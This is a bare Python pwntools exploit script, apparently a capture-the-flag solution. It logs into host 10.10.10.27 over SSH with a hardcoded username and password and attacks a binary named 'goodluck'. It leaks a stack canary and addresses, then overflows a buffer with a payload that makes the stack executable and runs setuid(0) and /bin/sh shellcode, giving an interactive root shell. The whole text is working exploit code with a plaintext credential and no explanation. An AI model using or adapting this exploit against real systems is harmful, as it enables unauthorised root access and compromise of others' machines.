#!/usr/bin/python3
from pwn import *

request = ssh(host="10.10.10.27", user="xalvas", password="18547936..*")
shell = request.process("/home/xalvas/app/goodluck")
exp = b"/tmp/{randoms(10)}"

request.upload_data(b"A" * 8 + p32(0x80002FF8), exp)
shell.sendline(exp)
shell.recv(4096)
shell.sendline(b"2")

res = shell.recv(4096).decode()
sct = re.findall(r'debug info: (0x[0-9a-f]+)', res)[0]

request.upload_data(p32(int(sct, 16)) + b'AAAA' + p32(0x80002ff4), exp)
shell.sendline(b"4")
shell.recv(4096)
shell.sendline(exp)
shell.recv(4096)
shell.sendline(b"3")

res = shell.recvuntil(b"Filename:  ").decode()
bdr = int(re.search(r'vulnerable pointer is at ([0-9a-f]+)', res).group(1), 16)

str, std = (int(x, 16) for x in re.search(r'\n([0-9a-f]{8})-([0-9a-f]{8}) rw-p 00000000 00:00 0          \[stack\]\n', res).groups())

prt = 0xb7efcd50
sze = std - str
payload = asm(shellcraft.setuid(0) + shellcraft.execve('/bin/sh'))
exploit =  payload
exploit += b"A" * (76 - len(payload))
exploit += p32(prt)
exploit += p32(bdr)
exploit += p32(str)
exploit += p32(sze)
exploit += p32(7)

request.upload_data(exploit, exp)
shell.sendline(exp)
request.unlink(exp)
shell.interactive()
